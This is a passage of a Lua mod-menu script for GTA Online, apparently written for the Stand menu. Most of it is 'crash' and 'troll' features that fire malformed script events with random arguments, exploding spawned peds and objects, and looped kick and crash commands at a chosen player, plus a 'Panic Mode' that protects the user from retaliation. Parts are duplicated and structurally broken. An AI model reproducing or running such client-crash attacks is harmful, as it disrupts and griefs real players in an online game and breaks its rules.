        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        		util.yield(100)
        			util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        	local mdl = util.joaat('a_c_poodle')
        		BlockSyncs(pid, function()
            	if request_model(mdl, 2) then
                	local pos = players.get_position(pid)
                	util.yield(1)
                	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                	ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                	local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                	WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                	local obj
                	repeat
                    	obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                	until obj ~= 0 or util.yield()
                	ENTITY.DETACH_ENTITY(obj, true, true) 
                	util.yield(1)
                	FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                	entities.delete_by_handle(ped1)
                	util.yield(1)
            else
                	util.toast("Failed to load model. :/")
	notification("Worth it HAHA!!!", colors.red)
            end
        end)
    end)
    	menu.toggle_loop(tehecrash, "Teheh Crash", {"toggletehe"}, "Stand crashes and trolls all in 1 looped(Laggy).", function(on_toggle)
    	notification("Teheheh sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
	menu.trigger_commands("bounty".. players.get_name(pid) .. " 10000")
	menu.trigger_commands("ceokick" .. players.get_name(pid))
	menu.trigger_commands("mugloop" .. players.get_name(pid))
	menu.trigger_commands("ring" .. players.get_name(pid))
	menu.trigger_commands("freeze" .. players.get_name(pid))
	menu.trigger_commands("confuse" .. players.get_name(pid))
	menu.trigger_commands("ceokick" .. players.get_name(pid))
	menu.trigger_commands("mugloop" .. players.get_name(pid))
	menu.trigger_commands("freeze" .. players.get_name(pid))
	menu.trigger_commands("confuse" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("explode" .. players.get_name(pid))
	menu.trigger_commands("crash".. PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash".. PLAYER.GET_PLAYER_NAME(pid))
                  menu.trigger_commands("steamroll" .. players.get_name(pid))
	menu.trigger_commands("footlettuce".. PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("notifyspam" .. players.get_name(pid))
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        		util.yield(100)
        			util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        	local mdl = util.joaat('a_c_poodle')
        		BlockSyncs(pid, function()
            	if request_model(mdl, 2) then
                	local pos = players.get_position(pid)
                	util.yield(1)
                	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                	ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                	local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                	WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                	local obj
                	repeat
                    	obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                	until obj ~= 0 or util.yield()
                	ENTITY.DETACH_ENTITY(obj, true, true) 
                	util.yield(1)
                	FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                	entities.delete_by_handle(ped1)
                	util.yield(1)
            else
                	util.toast("Failed to load model. :/")
	notification("Worth it HAHA!!!", colors.red)
            end
        end)
    end)

local function BlockSyncs(pid, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    util.yield(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end

        menu.toggle_loop(crash, "Poodle Crash V2", {"poodlev2"}, "", function(on_loop)
--Locals
        	local mdl = util.joaat('a_c_poodle')
        	local mdl1 = util.joaat('a_c_poodle')
        	local mdl2 = util.joaat('a_c_poodle')
        	BlockSyncs(pid, function()
            if request_model(mdl, mdl1, mdl2, 2) then
                	local pos = players.get_position(pid)
                	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                	local ped1 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                	local ped2 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
---------------------------------------------------------------------------------------------------------------------
--mdl GIVE WEAPON TO PED

                	ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 3, 0, 0), 0)
	ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), -3, 0, 0), 0)
                	local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                	WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                	local obj
                	repeat
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--mdl1 GIVE WEAPON TO PED

                	ped2 = entities.create_ped(26, mdl1, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                	ped2 = entities.create_ped(26, mdl1, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, -3, 0), 0)
                	local coords = ENTITY.GET_ENTITY_COORDS(ped2, true)
                	WEAPON.GIVE_WEAPON_TO_PED(ped2, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                	local obj
                	repeat
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--mdl2 GIVE WEAPON TO PED

                	ped2 = entities.create_ped(26, mdl2, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 3), 0)
                	ped2 = entities.create_ped(26, mdl2, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, -3), 0) 
                	local coords = ENTITY.GET_ENTITY_COORDS(ped2, true)
                	WEAPON.GIVE_WEAPON_TO_PED(ped2, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                	local obj
                	repeat
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--mdl DETACH ENTITY & ADD EXPLOSION

                    	obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                	until obj ~= 0 or util.yield()
                	ENTITY.DETACH_ENTITY(obj, true, true) 
                	util.yield(0)
                	FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                	entities.delete_by_handle(ped1)
                	util.yield(0)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--mdl1 DETACH ENTITY & ADD EXPLOSION

                    	obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped2, 0)
                	until obj ~= 0 or util.yield()
                	ENTITY.DETACH_ENTITY(obj, true, true) 
                	util.yield(0)
                	FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                	entities.delete_by_handle(ped2)
                	util.yield(0)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--mdl2 DETACH ENTITY & ADD EXPLOSION

                    	obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped2, 0)
                	until obj ~= 0 or util.yield()
                	ENTITY.DETACH_ENTITY(obj, true, true) 
                	util.yield(0)
                	FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                	entities.delete_by_handle(ped2)
                	util.yield(0)
	end
        end)
    end)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local function BlockSyncs(pid, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    util.yield(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end

    local fragcrash = menu.list(crash, "Fragment Crash", {}, "")

menu.toggle_loop(fragcrash, "Fragment Crash V2", {"togglefragv2"}, "", function(on_toggle)

        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        for i = 0, 100 do 
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        util.yield(10)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza2)
		return
	end
    end)



    local vehcrash = menu.list(crash, "Vehicle Crash", {}, "")

    	menu.action(vehcrash, "Vehicle Crash", {"vehcrash"}, "Sends them with a few car trolls then ton of op crash events starting with car crash events", function()
    	notification("Vehicle Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		util.yield(1500)
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
			local veh1 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords1, PlayerCoords.z, 180, true, false, true)
			local veh2 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords2, PlayerCoords.z, 0, true, false, true)
			-- Do stuff with veh ...
			ENTITY.SET_ENTITY_VELOCITY(veh1, 0, -100, 0)
			ENTITY.SET_ENTITY_VELOCITY(veh2, 0, 100, 0)
		end
	menu.trigger_commands("killveh" .. players.get_name(pid))
	menu.trigger_commands("poptires" .. players.get_name(pid))
	menu.trigger_commands("removedoors" .. players.get_name(pid))
	menu.trigger_commands("slingshot" .. players.get_name(pid))
	menu.trigger_commands("igniteveh" .. players.get_name(pid))
	menu.trigger_commands("vehkick" .. players.get_name(pid))
	menu.trigger_commands("novehs" .. players.get_name(pid))
	menu.trigger_commands("delveh" .. players.get_name(pid))
	menu.trigger_commands("slaughter" .. PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
		util.yield(100)
	menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
    	menu.trigger_commands("2t1spec" .. PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.toggle_loop(vehcrash, "Vehicle Crash", {"togglevehcrash"}, "Sends them with a few car trolls then ton of op crash events starting with car crash events", function(on_toggle)
    	notification("Vehicle Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		util.yield(1500)
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
			local veh1 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords1, PlayerCoords.z, 180, true, false, true)
			local veh2 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords2, PlayerCoords.z, 0, true, false, true)
			-- Do stuff with veh ...
			ENTITY.SET_ENTITY_VELOCITY(veh1, 0, -100, 0)
			ENTITY.SET_ENTITY_VELOCITY(veh2, 0, 100, 0)
		end
	menu.trigger_commands("killveh" .. players.get_name(pid))
	menu.trigger_commands("poptires" .. players.get_name(pid))
	menu.trigger_commands("removedoors" .. players.get_name(pid))
	menu.trigger_commands("slingshot" .. players.get_name(pid))
	menu.trigger_commands("igniteveh" .. players.get_name(pid))
	menu.trigger_commands("vehkick" .. players.get_name(pid))
	menu.trigger_commands("novehs" .. players.get_name(pid))
	menu.trigger_commands("delveh" .. players.get_name(pid))
	menu.trigger_commands("slaughter" .. PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
	menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
		util.yield(100)
	menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
    	menu.trigger_commands("2t1spec" .. PLAYER.GET_PLAYER_NAME(pid))
    			end)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local function random_args(id, amount)
    local args = {id}
    if not amount or amount == 0 then
        return args
    else
        for i = 2, amount + 1 do
            args[i] = math.random(-2147483647, 2147483647)
        end
        return args
    end
end

	menu.divider(crash, "Stand Crash Loops")

    	local standcrash = menu.list(crash, "Stand Crash Loops", {}, "")

	menu.divider(standcrash, "Stand Crash Loops")

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "Elegant", {"crash"}, "Blocked by most menus.", function()
            menu.trigger_commands("crash" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "Irresponsible Disclosure", {"smash"}, "Note: Use Panic Mode.", function(on_loop)
            menu.trigger_commands("smash" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "BDSM", {"choke"}, "Blocked by popular menus.", function(on_loop)
            menu.trigger_commands("choke" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "Indecent Exposure", {"flashcrash"}, "Blocked by popular menus.", function(on_loop)
            menu.trigger_commands("flashcrash" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "Next-Gen", {"ngcrash"}, "Blocked by popular menus.", function(on_loop)
            menu.trigger_commands("ngcrash" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "Steamroller", {"steamroll"}, "Note: This crash will also affect other players close to your target.", function(on_loop)
            menu.trigger_commands("steamroll" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "Burger King Foot Lettuce", {"footlettuce"}, "Can't be blocked without consequences, but the target might karma you for using it.", function(on_loop)
            menu.trigger_commands("footlettuce" .. players.get_name(pid))
        end)
    end

    if menu.get_edition() >= 2 then 
        menu.toggle_loop(standcrash, "Vehicular Manslaughter", {"slaughter"}, "A discrete kick that won't tell the target who did it. Unblockable when you are the host.", function(on_loop)
            menu.trigger_commands("slaughter" .. players.get_name(pid))
        end)
    end


	menu.divider(crash, "Before Crashes")

    	local acams = menu.list(crash, "Anti Crash Camera's", {}, "")

	menu.action(acams, "Anti Crash Camera On", {"acam"}, "Activates ped regen, invisibility, levitate, freecam, reducedcollision, nocollision, showcamall, confusecamall, potatomode, stops all sound events and blocks all connections", function()
		notification("Toggling Anti Crash Camera On", colors.blue)
		util.toast("Note: Your camera is free to fly around :)")
		if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
			menu.trigger_commands("mpfemale")

			menu.trigger_commands("invisibility" .. " On")
			menu.trigger_commands("levitate" .. " On")
			menu.trigger_commands("freecam" .. " On")
			menu.trigger_commands("potatomode on")
    			menu.trigger_commands("nosky on")
			menu.trigger_commands("reducedcollision" .. " On")
			menu.trigger_commands("nocollision" .. " On")
			menu.trigger_commands("showcamall" .. " On")
			menu.trigger_commands("confuseall" .. " On")
			menu.trigger_commands("desyncall on")
			menu.trigger_command(BlockIncSyncs)
			menu.trigger_command(BlockNetEvents)
			menu.trigger_commands("superc")
			menu.trigger_commands("clean")
    	local player_ped = PLAYER.PLAYER_PED_ID()    
    	local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    	local pld = PLAYER.GET_PLAYER_PED(pid)
    	local pos = ENTITY.GET_ENTITY_COORDS(pld)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.2188, -818.582, 2698.8700)
    			util.yield(1000)
    		for i=1,4  do
        			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.2188, -818.582, 2698.8700)
        			util.yield(1000)
    			end
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
		end
	
	end)

	menu.action(acams, "Anti Crash Camera Off", {"acamoff"}, "Deactivates ped regen,invisibility, levitate, freecam, reducedcollision, nocollision, showcamall, confusecamall, potatomode, stops all sound events and unblocks all connections", function()
		notification("Toggling Anti Crash Camera Off", colors.blue)
		for i=-1,100 do
			AUDIO.STOP_SOUND(i)
			AUDIO.RELEASE_SOUND_ID(i)
			end
		notification("Force Stopped All Sound Events", colors.green)
		if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
		notification("Removed Attachments", colors.green)
			menu.trigger_commands("mpfemale")
    	local player_ped = PLAYER.PLAYER_PED_ID()    
    	local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    	local pld = PLAYER.GET_PLAYER_PED(pid)
    	local pos = ENTITY.GET_ENTITY_COORDS(pld)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.40393, -819.56366, 326.17517)
    			util.yield(1000)
    		for i=1,4  do
        			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.40393, -819.56366, 326.17517)
        			util.yield(1000)
    			end
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
			menu.trigger_commands("invisibility" .. " Off")
			menu.trigger_commands("levitate" .. " Off")
			menu.trigger_commands("freecam" .. " Off")
			menu.trigger_commands("potatomode off")
    			menu.trigger_commands("nosky Off")
			menu.trigger_commands("reducedcollision" .. " Off")
			menu.trigger_commands("nocollision" .. " Off")
			menu.trigger_commands("showcamall" .. " Off")
			menu.trigger_commands("confuseall" .. " Off")
			menu.trigger_commands("desyncall off")
			menu.trigger_command(UnblockIncSyncs)
			menu.trigger_command(UnblockNetEvents)
			menu.trigger_commands("superc")
			menu.trigger_commands("clean")
		end
	
	end)

	menu.toggle(acams, "Panic Mode", {"panicmode"}, "This will render you basically uncrashable at the cost of disrupting all gameplay", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			notification("Toggling panic mode on... Get those cunts", colors.red)
			menu.trigger_commands("desyncall on")
			menu.trigger_command(BlockIncSyncs)
			menu.trigger_command(BlockNetEvents)
			menu.trigger_commands("anticrashcamera on")
		else
			notification("toggling panic mode off...", colors.red)
			menu.trigger_commands("desyncall off")
			menu.trigger_command(UnblockIncSyncs)
			menu.trigger_command(UnblockNetEvents)
			menu.trigger_commands("anticrashcamera off")
		end
	end)


        	menu.toggle(crash, "Block Player", {"block"}, "Shortcut to blocking the player join reaction ", function()
        	notification("Blocked " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            	menu.trigger_commands("historyblock" .. players.get_name(pid))
    			end)

	menu.action(crash, "Spectate", {"spec"}, "", function()
    	notification("Spectating " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid))
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
		end
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
		end)

	menu.action(troll_sub_vehicle_tab, "Car Ram", {"ram"}, "Don't drink and drive, folks", function()
    	notification("Ram that bitch!!! " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " on")
		util.yield(1500)
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
			local veh1 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords1, PlayerCoords.z, 180, true, false, true)
			local veh2 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords2, PlayerCoords.z, 0, true, false, true)
			-- Do stuff with veh ...
			ENTITY.SET_ENTITY_VELOCITY(veh1, 0, -100, 0)
			ENTITY.SET_ENTITY_VELOCITY(veh2, 0, 100, 0)
		end
		util.yield(5000)
